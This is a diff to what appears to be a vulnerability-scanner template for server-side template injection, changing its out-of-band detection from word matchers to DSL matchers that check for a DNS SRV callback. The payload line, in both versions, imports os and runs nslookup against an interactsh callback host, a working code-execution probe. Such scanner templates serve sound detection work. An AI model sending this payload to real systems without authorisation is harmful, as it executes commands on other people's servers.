@@ -19,7 +19,7 @@ http:
 
     payloads:
       injection:
-        - "{%25import+os%25}{{os.system('nslookup+{{interactsh-url}}')}}"
+        - "{%25import+os%25}{{os.system('nslookup+-type=SRV+{{interactsh-url}}')}}"
 
     skip-variables-check: true
 
@@ -30,15 +30,10 @@ http:
         fuzz:
           - "{{injection}}"
 
-    matchers-condition: and
     matchers:
-      - type: word
-        part: interactsh_protocol # Confirms the DNS Interaction
-        words:
-          - "dns"
-
-      - type: word
-        part: server
-        words:
-          - "Werkzeug"
-          - "Python"
+      - type: dsl
+        name: request-matcher
+        dsl:
+          - "contains(interactsh_protocol,'dns')"
+          - "contains(interactsh_request,'srv')"
+        condition: and
